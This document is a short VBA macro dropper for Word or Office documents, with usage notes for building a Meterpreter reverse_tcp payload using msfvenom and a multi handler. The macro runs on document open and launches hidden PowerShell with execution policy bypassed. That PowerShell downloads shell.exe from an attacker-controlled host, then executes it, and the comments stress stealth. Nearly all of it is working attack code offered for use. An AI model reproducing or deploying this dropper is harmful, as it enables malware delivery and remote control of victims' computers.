USAGE : ------
# Needs a local python server to serve a particular file
# Setup msfconsole multi handler
# Make payload using msfvenom ( msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=4444 -f exe -o shell.exe )
# Change the Lhost and Lport Options

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Sub AutoOpen()
    dropper
End Sub

Sub Document_Open()
    dropper
End Sub

Sub dropper()
    ' Defining variable to store remote web server address
    Dim url As String
    ' Defining variable to store PowerShell script/command to execute
    Dim psScript As String
    ' URL of the remote web server hosting the payload for initial access
    url = "http://192.168.31.10:80/shell.exe"
    ' PowerShell script to download and execute the file
    psScript = "Invoke-WebRequest -Uri """ & url & """ -OutFile ""C:\Users\public\file.exe""; Start-Process -FilePath ""C:\Users\public\file.exe"""
    ' Execute the PowerShell script using Shell and hides the Window for extra stealth
    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """", vbHide
End Sub
